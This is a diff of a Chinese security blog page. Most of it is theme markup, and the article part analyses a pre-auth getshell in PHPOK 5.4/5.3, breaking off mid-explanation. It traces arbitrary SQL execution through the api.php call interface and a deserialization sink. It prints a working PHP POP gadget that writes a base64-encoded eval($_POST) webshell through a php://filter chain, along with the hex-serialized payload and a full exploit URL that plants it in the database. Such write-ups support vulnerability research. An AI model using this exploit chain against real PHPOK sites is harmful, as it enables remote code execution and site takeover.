@@ -1,186 +1,234 @@
+
+
 <!DOCTYPE html>
-<html lang=zh>
+<html lang="zh-CN" data-default-color-scheme=&#34;dark&#34;>
+
+
+
 <head>
-    <!-- so meta -->
-    <meta charset="utf-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="HandheldFriendly" content="True">
-    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
-    <meta name="description" content="前言今天抽空审了下PHPOK5.4发现很多洞都是在后台，前台的洞才是真理!!!!．也发现前台一处可疑的文件写入，但是必须配合后台的洞显得就很鸡肋，之后在研究下． 学长晚上发了篇PHPOK前台geshell遂分析复现．讲道理最近看RIPS很多洞的反序列都是从sql注入开始，有点巧合.(…. 漏洞成因 不做判断过滤将用户输入的字段通过array_merge存入危险数组中 任意执行SQL语句 从数据库中">
-<meta property="og:type" content="article">
-<meta property="og:title" content="PHPok 5.4&#x2F;5.3前台getshell分析思考(踩坑)">
-<meta property="og:url" content="http://zhzhdoai.github.io/2019/12/12/PHPok-5-4-5-3%E5%89%8D%E5%8F%B0getshell-%E8%B8%A9%E5%9D%91/index.html">
-<meta property="og:site_name" content="osword&#39;s blog">
-<meta property="og:description" content="前言今天抽空审了下PHPOK5.4发现很多洞都是在后台，前台的洞才是真理!!!!．也发现前台一处可疑的文件写入，但是必须配合后台的洞显得就很鸡肋，之后在研究下． 学长晚上发了篇PHPOK前台geshell遂分析复现．讲道理最近看RIPS很多洞的反序列都是从sql注入开始，有点巧合.(…. 漏洞成因 不做判断过滤将用户输入的字段通过array_merge存入危险数组中 任意执行SQL语句 从数据库中">
-<meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://zhzhdoai.github.io/2019/12/12/PHPok-5-4-5-3%E5%89%8D%E5%8F%B0getshell-%E8%B8%A9%E5%9D%91/1576074296201.png">
-<meta property="og:image" content="http://zhzhdoai.github.io/2019/12/12/PHPok-5-4-5-3%E5%89%8D%E5%8F%B0getshell-%E8%B8%A9%E5%9D%91/1576073894768.png">
-<meta property="og:image" content="http://zhzhdoai.github.io/2019/12/12/PHPok-5-4-5-3%E5%89%8D%E5%8F%B0getshell-%E8%B8%A9%E5%9D%91/1576074462677.png">
-<meta property="og:image" content="http://zhzhdoai.github.io/2019/12/12/PHPok-5-4-5-3%E5%89%8D%E5%8F%B0getshell-%E8%B8%A9%E5%9D%91/1576074642832.png">
-<meta property="og:image" content="http://zhzhdoai.github.io/2019/12/12/PHPok-5-4-5-3%E5%89%8D%E5%8F%B0getshell-%E8%B8%A9%E5%9D%91/1576074696932.png">
-<meta property="og:image" content="http://zhzhdoai.github.io/2019/12/12/PHPok-5-4-5-3%E5%89%8D%E5%8F%B0getshell-%E8%B8%A9%E5%9D%91/1576074837952.png">
-<meta property="og:image" content="http://zhzhdoai.github.io/2019/12/12/PHPok-5-4-5-3%E5%89%8D%E5%8F%B0getshell-%E8%B8%A9%E5%9D%91/1576074931751.png">
-<meta property="og:image" content="http://zhzhdoai.github.io/2019/12/12/PHPok-5-4-5-3%E5%89%8D%E5%8F%B0getshell-%E8%B8%A9%E5%9D%91/1576073177233.png">
-<meta property="og:image" content="http://zhzhdoai.github.io/2019/12/12/PHPok-5-4-5-3%E5%89%8D%E5%8F%B0getshell-%E8%B8%A9%E5%9D%91/1576069510643.png">
-<meta property="og:image" content="http://zhzhdoai.github.io/2019/12/12/PHPok-5-4-5-3%E5%89%8D%E5%8F%B0getshell-%E8%B8%A9%E5%9D%91/1576073388011.png">
-<meta property="og:image" content="http://zhzhdoai.github.io/2019/12/12/PHPok-5-4-5-3%E5%89%8D%E5%8F%B0getshell-%E8%B8%A9%E5%9D%91/1576073122835.png">
-<meta property="og:image" content="http://zhzhdoai.github.io/2019/12/12/PHPok-5-4-5-3%E5%89%8D%E5%8F%B0getshell-%E8%B8%A9%E5%9D%91/1576119275513.png">
-<meta property="og:image" content="http://zhzhdoai.github.io/2019/12/12/PHPok-5-4-5-3%E5%89%8D%E5%8F%B0getshell-%E8%B8%A9%E5%9D%91/1576120808919.png">
-<meta property="og:image" content="http://zhzhdoai.github.io/2019/12/12/PHPok-5-4-5-3%E5%89%8D%E5%8F%B0getshell-%E8%B8%A9%E5%9D%91/1576119462806.png">
-<meta property="og:image" content="http://zhzhdoai.github.io/2019/12/12/PHPok-5-4-5-3%E5%89%8D%E5%8F%B0getshell-%E8%B8%A9%E5%9D%91/1576120561220.png">
-<meta property="og:image" content="http://zhzhdoai.github.io/2019/12/12/PHPok-5-4-5-3%E5%89%8D%E5%8F%B0getshell-%E8%B8%A9%E5%9D%91/1576121332860.png">
-<meta property="og:image" content="http://zhzhdoai.github.io/2019/12/12/PHPok-5-4-5-3%E5%89%8D%E5%8F%B0getshell-%E8%B8%A9%E5%9D%91/1576237048076.png">
-<meta property="og:image" content="http://zhzhdoai.github.io/2019/12/12/PHPok-5-4-5-3%E5%89%8D%E5%8F%B0getshell-%E8%B8%A9%E5%9D%91/1576239519071.png">
-<meta property="og:image" content="http://zhzhdoai.github.io/2019/12/12/PHPok-5-4-5-3%E5%89%8D%E5%8F%B0getshell-%E8%B8%A9%E5%9D%91/1576239482268.png">
-<meta property="og:image" content="http://zhzhdoai.github.io/2019/12/12/PHPok-5-4-5-3%E5%89%8D%E5%8F%B0getshell-%E8%B8%A9%E5%9D%91/1576237474445.png">
-<meta property="og:image" content="http://zhzhdoai.github.io/2019/12/12/PHPok-5-4-5-3%E5%89%8D%E5%8F%B0getshell-%E8%B8%A9%E5%9D%91/1576238022496.png">
-<meta property="article:published_time" content="2019-12-12T13:10:27.000Z">
-<meta property="article:modified_time" content="2020-05-15T08:31:08.000Z">
-<meta property="article:author" content="osword">
-<meta property="article:tag" content="代码审计">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://zhzhdoai.github.io/2019/12/12/PHPok-5-4-5-3%E5%89%8D%E5%8F%B0getshell-%E8%B8%A9%E5%9D%91/1576074296201.png">
-    
-    
-        
-          
-              <link rel="shortcut icon" href="/images/favicon.ico">
-          
-        
-        
-          
-            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
-          
-        
-        
-          
-            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
-          
-        
-    
-    <!-- title -->
-    <title>PHPok 5.4/5.3前台getshell分析思考(踩坑)</title>
-    <!-- styles -->
-    
-<link rel="stylesheet" href="/css/style.css">
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="osword">
+  <meta name="keywords" content="">
+  <title>PHPok 5.4/5.3前台getshell分析思考(踩坑) - osword&#39;s blog</title>
 
-    <!-- persian styles -->
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
     
       
-<link rel="stylesheet" href="/css/rtl.css">
-
+      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.0.0/styles/darcula.min.css" />
     
-    <!-- rss -->
-    
-    
-      <link rel="alternate" href="/true" title="osword&#39;s blog" type="application/atom+xml" />
-    
-<meta name="generator" content="Hexo 4.2.1"></head>
-
-<body class="max-width mx-auto px3 ltr">
-    
-      <div id="header-post">
-  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
-  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
-  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
-  <span id="menu">
-    <span id="nav">
-      <ul>
-         
-          <li><a href="/">首页</a></li>
-         
-          <li><a href="/about/">关于</a></li>
-         
-          <li><a href="/archives/">归档</a></li>
-         
-          <li><a href="/projects_url">项目</a></li>
-        
-      </ul>
-    </span>
-    <br/>
-    <span id="actions">
-      <ul>
-        
-        <li><a class="icon" href="/2019/12/14/Laravel-5-8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E4%B8%80/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
-        
-        
-        <li><a class="icon" href="/2019/11/24/WRITEUP-2019NJUPT-web%E9%A2%98%E8%A7%A3/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
-        
-        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
-        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
-      </ul>
-      <span id="i-prev" class="info" style="display:none;">上一篇</span>
-      <span id="i-next" class="info" style="display:none;">下一篇</span>
-      <span id="i-top" class="info" style="display:none;">返回顶部</span>
-      <span id="i-share" class="info" style="display:none;">分享文章</span>
-    </span>
-    <br/>
-    <div id="share" style="display: none">
-      <ul>
-  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://zhzhdoai.github.io/2019/12/12/PHPok-5-4-5-3%E5%89%8D%E5%8F%B0getshell-%E8%B8%A9%E5%9D%91/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://twitter.com/share?url=http://zhzhdoai.github.io/2019/12/12/PHPok-5-4-5-3%E5%89%8D%E5%8F%B0getshell-%E8%B8%A9%E5%9D%91/&text=PHPok 5.4/5.3前台getshell分析思考(踩坑)" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://zhzhdoai.github.io/2019/12/12/PHPok-5-4-5-3%E5%89%8D%E5%8F%B0getshell-%E8%B8%A9%E5%9D%91/&title=PHPok 5.4/5.3前台getshell分析思考(踩坑)" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://zhzhdoai.github.io/2019/12/12/PHPok-5-4-5-3%E5%89%8D%E5%8F%B0getshell-%E8%B8%A9%E5%9D%91/&is_video=false&description=PHPok 5.4/5.3前台getshell分析思考(踩坑)" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=PHPok 5.4/5.3前台getshell分析思考(踩坑)&body=Check out this article: http://zhzhdoai.github.io/2019/12/12/PHPok-5-4-5-3%E5%89%8D%E5%8F%B0getshell-%E8%B8%A9%E5%9D%91/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://getpocket.com/save?url=http://zhzhdoai.github.io/2019/12/12/PHPok-5-4-5-3%E5%89%8D%E5%8F%B0getshell-%E8%B8%A9%E5%9D%91/&title=PHPok 5.4/5.3前台getshell分析思考(踩坑)" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://reddit.com/submit?url=http://zhzhdoai.github.io/2019/12/12/PHPok-5-4-5-3%E5%89%8D%E5%8F%B0getshell-%E8%B8%A9%E5%9D%91/&title=PHPok 5.4/5.3前台getshell分析思考(踩坑)" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://zhzhdoai.github.io/2019/12/12/PHPok-5-4-5-3%E5%89%8D%E5%8F%B0getshell-%E8%B8%A9%E5%9D%91/&title=PHPok 5.4/5.3前台getshell分析思考(踩坑)" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://digg.com/submit?url=http://zhzhdoai.github.io/2019/12/12/PHPok-5-4-5-3%E5%89%8D%E5%8F%B0getshell-%E8%B8%A9%E5%9D%91/&title=PHPok 5.4/5.3前台getshell分析思考(踩坑)" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://zhzhdoai.github.io/2019/12/12/PHPok-5-4-5-3%E5%89%8D%E5%8F%B0getshell-%E8%B8%A9%E5%9D%91/&name=PHPok 5.4/5.3前台getshell分析思考(踩坑)&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://zhzhdoai.github.io/2019/12/12/PHPok-5-4-5-3%E5%89%8D%E5%8F%B0getshell-%E8%B8%A9%E5%9D%91/&t=PHPok 5.4/5.3前台getshell分析思考(踩坑)" target="_blank" rel="noopener"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
-</ul>
-
-    </div>
-    <div id="toc">
-      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#漏洞成因"><span class="toc-number">2.</span> <span class="toc-text">漏洞成因</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#漏洞分析"><span class="toc-number">3.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#漏洞复现"><span class="toc-number">4.</span> <span class="toc-text">漏洞复现</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#执行任意sql语句"><span class="toc-number">4.1.</span> <span class="toc-text">执行任意sql语句</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#其他利用链"><span class="toc-number">5.</span> <span class="toc-text">其他利用链</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#phpok-5-3"><span class="toc-number">6.</span> <span class="toc-text">phpok 5.3</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#exp"><span class="toc-number">7.</span> <span class="toc-text">exp</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#参考链接"><span class="toc-number">8.</span> <span class="toc-text">参考链接</span></a></li></ol>
-    </div>
-  </span>
-</div>
-
-    
-    <div class="content index py4">
-        
-        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
-  <header>
-    
-    <h1 class="posttitle" itemprop="name headline">
-        PHPok 5.4/5.3前台getshell分析思考(踩坑)
-    </h1>
-
-
-
-    <div class="meta">
-      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
-        <span itemprop="name">osword's blog</span>
-      </span>
-      
-    <div class="postdate">
-      
-        <time datetime="2019-12-12T13:10:27.000Z" itemprop="datePublished">2019-12-12</time>
-        
-      
-    </div>
-
-
-      
-
-      
-    <div class="article-tag">
-        <i class="fas fa-tag"></i>
-        <a class="tag-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a>
-    </div>
-
-
-      <span id="/2019/12/12/PHPok-5-4-5-3%E5%89%8D%E5%8F%B0getshell-%E8%B8%A9%E5%9D%91/" class="leancloud_visitors" data-flag-title="PHPok 5.4/5.3前台getshell分析思考(踩坑)">
-    <em class="post-meta-item-text">阅读量 </em>
-    <i class="leancloud-visitors-count" data-index="/2019/12/12/PHPok-5-4-5-3%E5%89%8D%E5%8F%B0getshell-%E8%B8%A9%E5%9D%91/"></span>
-    </div>
-
-  </header>
   
 
-  <div class="content" itemprop="articleBody">
-    <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>今天抽空审了下PHPOK5.4发现很多洞都是在后台，前台的洞才是真理!!!!．也发现前台一处可疑的文件写入，但是必须配合后台的洞显得就很鸡肋，之后在研究下．</p>
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_pf9vaxs7x7b.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Fluid</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner intro-2" id="background" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="container page-header text-center fade-in-up">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2019-12-12 21:10" pubdate>
+        2019年12月12日 晚上
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      1.4k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      19
+       分钟
+    </span>
+  
+
+  
+  
+    
+      <!-- 不蒜子统计文章PV -->
+      <span id="busuanzi_container_page_pv" style="display: none">
+        <i class="iconfont icon-eye" aria-hidden="true"></i>
+        <span id="busuanzi_value_page_pv"></span> 次
+      </span>
+    
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto" id="post">
+            <!-- SEO header -->
+            <h1 style="display: none">PHPok 5.4/5.3前台getshell分析思考(踩坑)</h1>
+            
+            <div class="markdown-body" id="post-body">
+              <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>今天抽空审了下PHPOK5.4发现很多洞都是在后台，前台的洞才是真理!!!!．也发现前台一处可疑的文件写入，但是必须配合后台的洞显得就很鸡肋，之后在研究下．</p>
 <p>学长晚上发了篇PHPOK前台geshell遂分析复现．讲道理最近看RIPS很多洞的反序列都是从sql注入开始，有点巧合.(….</p>
 <h1 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h1><ol>
 <li>不做判断过滤将用户输入的字段通过<code>array_merge</code>存入危险数组中</li>
@@ -190,44 +238,54 @@
 </ol>
 <h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>漏洞触发入口：framework/api/call_control.php</p>
 <p>将用户输入json格式data值传入<code>phpok</code>函数</p>
-<p><img src="./1576074296201.png" alt="1576074296201"></p>
+<p><img src="./1576074296201.png" srcset="/img/loading.gif" alt="1576074296201"></p>
 <p>接着跟进:framework/phpok_tpl_helper.php</p>
-<p><img src="./1576073894768.png" alt="1576073894768"></p>
+<p><img src="./1576073894768.png" srcset="/img/loading.gif" alt="1576073894768"></p>
 <p>跟进framework/phpok_call.php phpok方法，在第102行中将用户输入的json格式<code>rs</code>存入<code>$call_rs</code>数组中</p>
 <p>再通过第119行调用’type_id’键(可控)</p>
-<p><img src="./1576074462677.png" alt="1576074462677"></p>
+<p><img src="./1576074462677.png" srcset="/img/loading.gif" alt="1576074462677"></p>
 <p>接着代码执行到133执行函数</p>
-<p><img src="./1576074642832.png" alt="1576074642832"></p>
+<p><img src="./1576074642832.png" srcset="/img/loading.gif" alt="1576074642832"></p>
 <p>接下来就是找利用的函数,可调用函数<code>$func</code>可以查找framework/phpok_call.php文件中以下划线开头的函数如<code>_sql</code>,<code>_arclist</code>….</p>
 <p>直接跟进<code>_sql</code>函数,会执行<code>get_all</code>，且其中$rs[‘sqlinfo’]可控，可以通过上面array_merge存入$rs数组中</p>
-<p><img src="./1576074696932.png" alt="1576074696932"></p>
+<p><img src="./1576074696932.png" srcset="/img/loading.gif" alt="1576074696932"></p>
 <p>最后代码会$rs[‘sqlinfo’]语句会代入query方法执行任意SQL语句</p>
-<p><img src="./1576074837952.png" alt="1576074837952"></p>
+<p><img src="./1576074837952.png" srcset="/img/loading.gif" alt="1576074837952"></p>
 <p>再找可以getshell的点，<code>_fields</code>函数出存在反序列化，反序列化的值是由数据库中带出.以前就关注过这里的反序列化，但是没有去深究如何控制这里的变量．</p>
-<p><img src="./1576074931751.png" alt="1576074931751"></p>
+<p><img src="./1576074931751.png" srcset="/img/loading.gif" alt="1576074931751"></p>
 <h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><h2 id="执行任意sql语句"><a href="#执行任意sql语句" class="headerlink" title="执行任意sql语句"></a>执行任意sql语句</h2><p>构造POP</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cache</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $key_id=<span class="string">'osword'</span>;</span><br><span class="line">    <span class="keyword">protected</span> $key_list=<span class="string">'aaaaaIDw/cGhwIGV2YWwoJF9QT1NUW29zd29yZF0pOz8+'</span>;</span><br><span class="line">    <span class="keyword">protected</span> $folder=<span class="string">'php://filter/write=string.strip_tags|convert.base64-decode/resource='</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> bin2hex(serialize(<span class="keyword">new</span> cache()));</span><br><span class="line"><span class="comment">#$b=hex2bin($a);</span></span><br><span class="line"></span><br><span class="line"><span class="number">4</span>f3a353a226361636865223a333a7b733a393a22002a006b65795f6964223b733a363a226f73776f7264223b733a31313a22002a006b65795f6c697374223b733a34353a2261616161614944772f63476877494756325957776f4a46395154314e555732397a643239795a4630704f7a382b223b733a393a22002a00666f6c646572223b733a36383a227068703a2f2f66696c7465722f77726974653d737472696e672e73747269705f746167737c636f6e766572742e6261736536342d6465636f64652f7265736f757263653d223b7d</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">cache</span></span>&#123;
+    <span class="hljs-keyword">protected</span> $key_id=<span class="hljs-string">'osword'</span>;
+    <span class="hljs-keyword">protected</span> $key_list=<span class="hljs-string">'aaaaaIDw/cGhwIGV2YWwoJF9QT1NUW29zd29yZF0pOz8+'</span>;
+    <span class="hljs-keyword">protected</span> $folder=<span class="hljs-string">'php://filter/write=string.strip_tags|convert.base64-decode/resource='</span>;
+&#125;
+
+<span class="hljs-keyword">echo</span> bin2hex(serialize(<span class="hljs-keyword">new</span> cache()));
+<span class="hljs-comment">#$b=hex2bin($a);</span>
+
+<span class="hljs-number">4</span>f3a353a226361636865223a333a7b733a393a22002a006b65795f6964223b733a363a226f73776f7264223b733a31313a22002a006b65795f6c697374223b733a34353a2261616161614944772f63476877494756325957776f4a46395154314e555732397a643239795a4630704f7a382b223b733a393a22002a00666f6c646572223b733a36383a227068703a2f2f66696c7465722f77726974653d737472696e672e73747269705f746167737c636f6e766572742e6261736536342d6465636f64652f7265736f757263653d223b7d</code></pre>
 
 
 
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;cms&#x2F;phpok5.4&#x2F;api.php?c&#x3D;call&amp;f&#x3D;index&amp;data&#x3D;&#123;&quot;m_picplayer&quot;:&#123;&quot;site&quot;:1,&quot;type_id&quot;:&quot;sql&quot;,&quot;sqlinfo&quot;:&quot;INSERT INTO &#96;phpok5&#96;.&#96;qinggan_fields&#96;(&#96;id&#96;, &#96;ftype&#96;, &#96;title&#96;, &#96;identifier&#96;, &#96;field_type&#96;, &#96;note&#96;, &#96;form_type&#96;, &#96;form_style&#96;, &#96;format&#96;, &#96;content&#96;, &#96;ext&#96;, &#96;search_separator&#96;, &#96;form_class&#96;) VALUES (988, &#39;988&#39;, &#39;test&#39;, &#39;test&#39;, &#39;varchar&#39;, &#39;test&#39;, &#39;text&#39;, &#39;test&#39;, &#39;safe&#39;, &#39;test&#39;,0x4f3a353a226361636865223a333a7b733a393a22002a006b65795f6964223b733a363a226f73776f7264223b733a31313a22002a006b65795f6c697374223b733a34353a2261616161614944772f63476877494756325957776f4a46395154314e555732397a643239795a4630704f7a382b223b733a393a22002a00666f6c646572223b733a36383a227068703a2f2f66696c7465722f77726974653d737472696e672e73747269705f746167737c636f6e766572742e6261736536342d6465636f64652f7265736f757263653d223b7d,&#39;test&#39;, &#39;test&#39;)&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs autohotkey"><span class="hljs-title">http:</span>//<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>/cms/phpok5.<span class="hljs-number">4</span>/api.php?c=call&amp;f=index&amp;data=&#123;<span class="hljs-string">"m_picplayer"</span>:&#123;<span class="hljs-string">"site"</span>:<span class="hljs-number">1</span>,<span class="hljs-string">"type_id"</span>:<span class="hljs-string">"sql"</span>,<span class="hljs-string">"sqlinfo"</span>:<span class="hljs-string">"INSERT INTO `phpok5`.`qinggan_fields`(`id`, `ftype`, `title`, `identifier`, `field_type`, `note`, `form_type`, `form_style`, `format`, `content`, `ext`, `search_separator`, `form_class`) VALUES (988, '988', 'test', 'test', 'varchar', 'test', 'text', 'test', 'safe', 'test',0x4f3a353a226361636865223a333a7b733a393a22002a006b65795f6964223b733a363a226f73776f7264223b733a31313a22002a006b65795f6c697374223b733a34353a2261616161614944772f63476877494756325957776f4a46395154314e555732397a643239795a4630704f7a382b223b733a393a22002a00666f6c646572223b733a36383a227068703a2f2f66696c7465722f77726974653d737472696e672e73747269705f746167737c636f6e766572742e6261736536342d6465636f64652f7265736f757263653d223b7d,'test', 'test')"</span>&#125;&#125;</code></pre>
 
-<p><img src="./1576073177233.png" alt="1576073177233"></p>
+<p><img src="./1576073177233.png" srcset="/img/loading.gif" alt="1576073177233"></p>
 <p>打入如下payload</p>
 <p>由于最后从<strong>qinggan_fields</strong>表中取出的数据是从<strong>qinggan_module</strong>表中依据<code>module</code>字段取数据,在满足IF语句从<strong>qinggan_module</strong>表取的数据需要带<code>status</code>,<code>module</code>，该处module字段值后前面打入payload的<code>ftype</code>值相同，具体原因可以自行调试</p>
